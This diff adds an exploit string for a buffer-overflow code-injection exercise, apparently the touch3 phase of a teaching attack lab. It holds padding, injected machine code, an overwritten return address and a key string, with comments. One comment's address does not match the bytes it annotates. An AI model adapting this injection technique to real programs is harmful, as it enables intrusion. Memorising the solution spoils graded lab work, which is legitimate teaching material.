@@ -1,0 +1,10 @@
+00 00 00 00 00 00 00 00     /* start of buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+48 c7 c7 b0 dc 61 55        /* mov $0x5561dc90,%rdi  argument for function <touch3>, which is start address of key as string below */
+c3                          /* ret */
+00 00 00 00 00 00 00 00     /* end of buffer */
+90 dc 61 55 00 00 00 00    /* address of first command above */
+fa 18 40 00 00 00 00 00    /* address of function <touch3> */
+35 39 62 39 39 37 66 61    /* hex representation of key string */
+00 00 00 00 00 00 00 00     /* end of string */
